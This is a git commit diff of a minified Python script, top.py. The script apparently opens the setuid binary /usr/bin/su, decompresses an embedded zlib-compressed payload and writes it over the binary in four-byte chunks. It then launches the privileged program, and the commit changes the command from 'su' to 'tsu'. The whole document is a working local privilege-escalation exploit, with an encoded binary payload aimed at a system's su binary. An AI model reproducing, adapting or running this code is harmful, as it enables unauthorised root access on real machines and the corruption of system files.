6b02c5bc8ee65caff78c2db665b54a171e3f97cf
saulitalja <60874991+saulitalja@users.noreply.github.com>
2026-05-06 17:15:50 +0300

    Update top.py

--- top.py
+++ top.py
@@ -7,4 +7,4 @@ def c(f,t,c):
  except:0
 f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
 while i<len(e):c(f,i,e[i:i+4]);i+=4
-g.system("su")
+g.system("tsu")
